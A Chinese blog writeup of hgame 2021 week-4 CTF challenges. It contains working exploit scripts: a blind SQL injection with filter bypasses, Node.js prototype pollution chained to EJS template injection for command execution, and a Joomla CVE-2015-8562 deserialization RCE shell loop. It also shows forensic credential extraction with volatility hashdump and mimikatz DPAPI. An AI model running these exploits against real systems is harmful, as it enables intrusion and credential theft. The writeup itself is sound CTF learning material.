---
title: 'hgame-week4-writeup'
date: 2021-02-20T21:35:00+08:00
draft: false
---

这周好困好困，每天醒来只能保持 3h 的精力，哎。题目卡住以后倒是把寒假计划中的其他事情摸完了。



# Web

## Unforgettable

这道题是截止前几个小时静下心来做的，本来都打算放掉这题去把我暑假计划的其他东西搞定

之前测试的时候发现我注册的账号很快就会失效（被删除）

初步怀疑是和 sql 注入有关，而且注入点应该和账号的信息有关



回过神来已经是 ddl 前几个小时了，开始尝试找注入点

先测试了用户名，发现有一些过滤：

> 空格、and、=、sleep、<、>、like、||、union

等号用 regexp 代替

空格用/**/代替

sleep 用 benchmark 代替

然后试了这个用户名：

```
1'/**/#
```

在首页中是这样

![image-20210227160621974](https://i.loli.net/2021/02/27/DRW5FbV1gerKpmH.png)

但是进入/user后是这样：

![image-20210227160706599](https://i.loli.net/2021/02/27/ngEKJbG5YLSkmsU.png)

说明 sql 语句在 /user 页面执行了

然后就是盲注

有好些细节还不太懂，问了liki，然后写了程序

```python
import httpx
from bs4 import BeautifulSoup
import time

session = httpx.Client(proxies={'all://':None})

def tryPayload(payload):
    username = payload
    username = username.replace(' ', '/**/')
    print(username)
    r = session.get('https://unforgettable.liki.link/register')
    csrf_token = BeautifulSoup(r,'lxml').find('input',id='csrf_token')['value']
    email = str(int(time.time())) + '@qq.com'
    password = str(int(time.time()))
    registerData = {'csrf_token':csrf_token,
                    'username':username,
                    'email':email,
                    'password':password,
                    'submit':'注册'}
    # print(registerData)
    r = session.post('https://unforgettable.liki.link/register',data=registerData)
    result = BeautifulSoup(r,'lxml').find('div',class_='alert').contents[2]
    print(result)
    if 'You have registered!' in result:
        r = session.get('https://unforgettable.liki.link/login')
        csrf_token = BeautifulSoup(r,'lxml').find('input',id='csrf_token')['value']
        loginData = {'csrf_token':csrf_token,
                    'email':email,
                    'password':password,
                    'submit':'登录'}
        session.post('https://unforgettable.liki.link/login',data=loginData)
        r = session.get('https://unforgettable.liki.link/user',timeout=600,allow_redirects=False)
        # 这个不允许跳转真的太太太重要了
        print(r.elapsed.total_seconds())
        return r.elapsed.total_seconds()

def getOutput(shell):
    # 获取返回结果的长度
    outputLength = 1
    while 1:
        temp = ''
        for _ in range(outputLength):
            temp += '.'
        payload = "1'&& if(({}) regexp '^{}',0,benchmark(5000000,sha2('a',256)))#{}".format(shell, temp, str(int(time.time())))
        if tryPayload(payload) < 1.5:
            outputLength += 1
        else:
            break
    print(outputLength)

    # 获取返回的结果
    output = ''
    wordList = '_,abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 @$~'
    for _ in range(outputLength-1): # 末尾是"\0"所以少读一位就够了
        for i in range(len(wordList)):
            temp = output
            temp += wordList[i]
            payload = "1'&& if(({}) regexp '^{}',benchmark(5000000,sha2('a',256)),0)#{}".format(shell, temp, str(int(time.time())))
            if tryPayload(payload) > 1.5:
                output += wordList[i]
                break
    print(output)
    return output

# 数据库名
DBName = getOutput('database()')
# DBName = 'todolist'
print(DBName)
# 表名
tableNames = getOutput("select group_concat(table_name) from information_schema.tables where table_schema in ('{}')".format(DBName))
# tableNames = 'ffflllaagggg,todolist,user'
print(tableNames)
tableName = tableNames[:tableNames.index(',')]
# 表字段
columnName = getOutput("select group_concat(column_name) from information_schema.columns where table_name in ('{}')".format(tableName))
# columnName = 'ffllllaaaagg'
print(columnName)
# 获取flag
flag = getOutput('select/**/{}/**/from/**/{}'.format(columnName, tableName))
# flag = '0rm_i5_th3_s0lu7ion'
print(flag)
```



hgame{0rm_i5_th3_s0lu7ion}



## 漫无止境的星期日

![image-20210222032705759](https://i.loli.net/2021/02/22/iTnytNpf9ZA1j62.png)

代码分析，判断存在原型链污染问题

![image-20210222192634974](https://i.loli.net/2021/02/22/RN48ZOBHQ9V6WTP.png)

本来 Post 的是表单数据，利用特性，可以 Post Json 上去，让服务器解析，结合资料：

[深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)

构建payload：

```json
{"name": "test1", "discription": "test2", "__proto__": {"crying": true}}
```

![image-20210222192953602](https://i.loli.net/2021/02/22/OysJ769jaSIcx8b.png)

发送后获得新 Cookie

成功进入 Wish 页面（这里大意了，挺早就构造了对的 Payload ，结果一直没有去 Wish 页面检查是否可以进入）

![image-20210222193032465](https://i.loli.net/2021/02/22/b4LZW72oTK3aQCU.png)

接下来就是考虑利用这个[模板字符串](https://ejs.bootcss.com/)的漏洞

![image-20210222204132638](https://i.loli.net/2021/02/22/f7dc6x8VWnTwBO9.png)

然后写了程序测试了一下

![image-20210222211809934](https://i.loli.net/2021/02/22/AcGWq7I3EUORXfv.png)

成功执行语句

然后试了半天成功执行 shell 语句

```
<%- global.process.mainModule.require('child_process').execSync('ls') %>
```



然后贴程序：

```python
import httpx
from bs4 import BeautifulSoup
session = httpx.Client(proxies={'all://':None})
while 1:
    payload = {'wishes': "<%- global.process.mainModule.require('child_process').execSync('"+input('payload:')+"') %>"}
    
    payload1 = {"name": "test3", "discription": "test2", "__proto__": {"crying": True}}
    r = session.post('http://macguffin.0727.site:5000/',json = payload1,allow_redirects=False)
    print(r.content)
    session.post('http://macguffin.0727.site:5000/wish', json = payload)
    r = session.get('http://macguffin.0727.site:5000/show')
    soup = BeautifulSoup(r,'lxml')
    print(soup.find('div', class_='wishes'))
```

然后开始翻目录

![image-20210222222822841](https://i.loli.net/2021/02/22/DknNjEBm64lhwJb.png)

![image-20210222222848828](https://i.loli.net/2021/02/22/I1lZXMPGLqzC6eQ.png)



hgame{nOdeJs_Prot0type_ls_fUnny\&amp;Ejs_Templ@te_Injection}

中间有特殊符号

索性就这样拿

```
cat ../../../flag|base64
```



hgame{nOdeJs_Prot0type_ls_fUnny&Ejs_Templ@te_Injection}



当然 你也能这样拿：

```
cat ../../../flag|md5sum
```

（狗头保命）

## joomlaJoomla!!!!!

因为各种奇奇怪怪的原因，跑去用 kali 了。

按照下面的代码安装 msfconsole

```
sudo systemctl enable --now postgresql
sudo gem install bundler -v 2.2.4
sudo msfdb reinit
sudo msfconsole
```

使用 msfconsole 中的 joomla_version 程序分析 joomla 版本

```
sudo msfconsole
search joomla
use auxiliary/scanner/http/joomla_version
set RHOSTS 0300ccc44c.joomla.r4u.top
set RPORT 6788
run
```

![image-20210225132817110](https://i.loli.net/2021/02/25/HJyXWxNvzDYomBU.png)

可以看出网站程序版本是 3.4.5

下载 Joomla 3.4.5 和题目提供的网站程序进行比较

![image-20210226055049296](https://i.loli.net/2021/02/26/qvabDQuhZ75mX3C.png)

![image-20210226055112892](https://i.loli.net/2021/02/26/UFW9hKNI8VbciE1.png)

可以看出这里有一个过滤”|“的操作，针对CVE-2015-8562做的防护

不过这个应该双写||就能绕过，毕竟只替换一次。

![image-20210226194731011](https://i.loli.net/2021/02/26/qRO4o6THvP7V1JU.png)

然后就是看看大佬们的脚本

然后面向 Ctrl-C+V 编程，加入自己需要的一些东西

（这里因为print一次打印的字符有限，在测试的时候直接将文本输出到了文件中查看，然后再修改程序）

程序：

```python
import requests
def conversor(data):
    # 将命令转换一下
    converted_cmd = ""
    for char in data:
        converted_cmd += "chr({0}).".format(ord(char))
    return converted_cmd[:-1]

def build_payload(rce_payload):
    rce_payload = "eval({0})".format(conversor(rce_payload))
    end = '\xf0\xfd\xfd\xfd' # 截断操作 仿照wordpress的xss
    payload = r'''}__test||O:21:"JDatabaseDriverMysqli":'''\
                r'''3:{s:2:"fc";O:17:"JSimplepieFactory":'''\
                r'''0:{}s:21:"\0\0\0disconnectHandlers";'''\
                r'''a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{'''\
                r'''s:8:"sanitize";O:20:"JDatabaseDriverMysql":'''\
                r'''0:{}s:8:"feed_url";'''
    payload_field = "{0};JFactory::getConfig();exit".format(rce_payload)
    payload += r'''s:{0}:"{1}"'''.format(str(len(payload_field)),
                                            payload_field)
    payload += r''';s:19:"cache_name_function";s:6:"assert";'''\
                r'''s:5:"cache";b:1;s:11:"cache_class";O:20:'''\
                r'''"JDatabaseDriverMysql":0:{}}i:1;s:4:'''\
                r'''"init";}}s:13:"\0\0\0connection";b:1;}''' + end
    return payload

def get_url(url, ua):
    headers={'User-Agent': ua}
    session = requests.session()
    r = session.get(url, headers=headers)
    for _ in range(3):
        r = session.get(url, headers=headers)
    return r

while 1:
    payload = 'system(\'' + input('$') + '\');'
    r = get_url('http://0300ccc44c.joomla.r4u.top:6788/',build_payload(payload))
    print(r.content.decode()[r.content.decode().index('</html>')+8:r.content.decode().index('<b>Warning</b>:  assert():')-8])
```

运行程序然后直接输入命令即可

![image-20210226195518314](https://i.loli.net/2021/02/26/Zo8XKuwrDdV1cWI.png)



hgame{WelCoME~TO-ThIs_Re4Lw0RLD}



# MISC

## Akira之瞳-1

判断内存镜像的操作系统

```powershell
.\volatility_2.6_win64_standalone.exe -f .\important_work.raw imageinfo
```

![image-20210221012544307](https://i.loli.net/2021/02/21/Ac7F816GPaBEKMx.png)

列出进程列表

```powershell
.\volatility_2.6_win64_standalone.exe -f .\important_work.raw --profile=Win7SP1x64_23418 pslist
```

![image-20210221012728466](https://i.loli.net/2021/02/21/3DhdUqkaXBRrlcb.png)

![image-20210221013433598](https://i.loli.net/2021/02/21/NyIQubrmEwnOGpV.png)

发现可疑程序

导出内存

```powershell
.\volatility_2.6_win64_standalone.exe -f .\important_work.raw --profile=Win7SP1x64_23418 memdump -p 1092 --dump-dir=./
```



使用 foremost 分析内存数据

```
foremost 1092.dmp
```

得到一个 zip 文件

![image-20210221013919488](https://i.loli.net/2021/02/21/kKMjGSZ5NUoO4gf.png)

压缩包加密了，但是给出了提示

![image-20210221014003387](https://i.loli.net/2021/02/21/96F8phsygHk45rq.png)

查询系统登录密码

```
.\volatility_2.6_win64_standalone.exe -f .\important_work.raw --profile=Win7SP1x64_23418 hashdump
```

![image-20210221020248778](https://i.loli.net/2021/02/21/WhPckxwpHMStajR.png)

![img](https://i.loli.net/2021/02/21/afco93MADt61wpT.png)

所以把 nt-hash 直接丢到 [cmd5](https://www.cmd5.com/) 里解密 可以得到密码

![image-20210221020410030](https://i.loli.net/2021/02/21/6sJBLH5XZAVR9gT.png)

将获得的密码 sha256 加密后得到：

20504cdfddaad0b590ca53c4861edd4f5f5cf9c348c38295bd2dbf0e91bca4c3



解压文件

拿到两张照片

![image-20210221020554217](https://i.loli.net/2021/02/21/Eg2N7346o5pWnvP.png)



使用 [BlindWaterMark](https://github.com/chishaxie/BlindWaterMark) 解盲水印

![image-20210221092056314](https://i.loli.net/2021/02/21/hZUpWcbJoIlLm5n.png)

然后拿着小拳拳去找出题人问

获得flag



hgame{7he_f1ame_brin9s_me_end1ess_9rief}



噪点不是亿点点的多



## Akira之瞳-2

```
wget https://bootstrap.pypa.io/2.6/get-pip.py
sudo python2 get-pip.py
sudo pip2 install --upgrade pip
sudo pip2 install --upgrade setuptools
sudo apt install python-dev
sudo pip2 install pycrypto
sudo pip2 install distorm3
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility
python setup.py install
```

然后就是标准操作：

```
vol.py -f secret_work.raw imageinfo
vol.py -f secret_work.raw --profile=Win7SP1x64_23418 filescan 
```

但是内存中有大量的文件，根本看不过来

盲猜需要的文件名中含有 "dump" 

使用 grep 筛选：

```
vol.py -f secret_work.raw --profile=Win7SP1x64_23418 filescan|grep "dump"
```

![image-20210223103743544](https://i.loli.net/2021/02/23/D9uMLG4slj675Zf.png)

导出文件

```
vol.py -f secret_work.raw --profile=Win7SP1x64_23418 dumpfiles -Q 0x000000007ef94820 -D ./
```

![image-20210223105628915](https://i.loli.net/2021/02/23/p7RIg1eMvZhlToQ.png)

打开后

![image-20210223105707279](https://i.loli.net/2021/02/23/crs5YuwzoXPaOC8.png)

```
zip password is: 5trqES&P43#y&1TO
And you may need LastPass
```

解压 secret.7z 后，得到：

![image-20210223105850550](https://i.loli.net/2021/02/23/kyxPL9hX5rMnWpN.png)

根据 txt 的提示，接下来的任务和LastPass有关

查阅相关文章，顺便翻了一下去年的WP

https://www.freebuf.com/articles/system/117553.html

https://www.ghettoforensics.com/2013/10/dumping-malware-configuration-data-from.html



https://github.com/kevthehermit/volatility_plugins/tree/master/lastpass



```
sudo pip2 install yara-python
```

然后尝试：

```
vol.py --plugins=/home/atom/volatility_plugins/lastpass -f secret_work.raw --profile=Win7SP1x64_23418 lastpass
```

![image-20210223144443275](https://i.loli.net/2021/02/23/5lAg69HMIZf4Vdw.png)

获得一个登录密码

> UserName: windows login & miscrosoft
> Pasword: vIg*q3x6GFa5aFBA



查[资料](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++)解那个 Chrome 的 Cookies 文件

修改文件夹选项，把这个勾勾点掉，就可以看到 S-1-5-21-262715442-3761430816-2198621988-1001 文件夹下的文件

![image-20210224090218279](https://i.loli.net/2021/02/24/2OaLdVD8RtMUNXq.png)

![image-20210224090537759](https://i.loli.net/2021/02/24/tpsNmJHAfRjk45E.png)



使用 mimikatz 计算 master key （这里傻乎乎卡了半天，最后问了 Akira 才知道那个文件是隐藏的）

```
dpapi::masterkey /in:"D:\hgame\week4\secret_work_bd40aea1c133a4d6422925deccb139e9\secret\S-1-5-21-262715442-3761430816-2198621988-1001\57935170-beab-4565-ba79-2b09570b95a6" /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:vIg*q3x6GFa5aFBA
```

![image-20210224090717687](https://i.loli.net/2021/02/24/cEkOYduZ5iH6P9C.png)

master key：8fc9b889a47a7216d5b39c87f8192d84a9eb8c57

然后解 Cookies ：

```
dpapi::chrome /in:"D:\hgame\week4\secret_work_bd40aea1c133a4d6422925deccb139e9\secret\Cookies" /masterkey:8fc9b889a47a7216d5b39c87f8192d84a9eb8c57
```

![image-20210224090815455](C:/Users/24385/AppData/Roaming/Typora/typora-user-images/image-20210224090815455.png)

> Host  : localhost ( / )
> Name  : VeraCrypt
> Dates : 2021/2/19 14:08:59 -> 2022/2/19 14:00:00
>  * volatile cache: GUID:{57935170-beab-4565-ba79-2b09570b95a6};KeyHash:8fc9b889a47a7216d5b39c87f8192d84a9eb8c57;Key:available
>  * masterkey     : 8fc9b889a47a7216d5b39c87f8192d84a9eb8c57
> Cookie: !bWjAqM2z!iSoJsV\*&IRV@*AVI1VrtAb



和去年一样使用 VeraCrypt 加载加密卷

![image-20210224093220148](https://i.loli.net/2021/02/24/kldJjG8qmHCocWR.png)

打开加密卷

![image-20210224093513487](https://i.loli.net/2021/02/24/BfjDGnUV58wKydc.png)

根据图片文件名的提醒，这一步是要解NTFS交换数据流隐写

由于懒得装其他软件，直接盲猜flag所在位置

```
notepad.exe ADS.jpg:flag.txt
```

![image-20210224094931788](https://i.loli.net/2021/02/24/aY59NHZqPuSmnpx.png)



hgame{Which_0nly_cryin9_3yes_c4n_de5cribe}



PS. yara 是一个包 yara-python是一个包 yara-ctypes 又是一个包，最开始我装的是yara，结果。。。

![image-20210223142959478](https://i.loli.net/2021/02/23/j1f8NdVCpTOEnJF.png)

嗯 孩子走的很安详 [解决方案](https://github.com/volatilityfoundation/volatility/issues/360) 

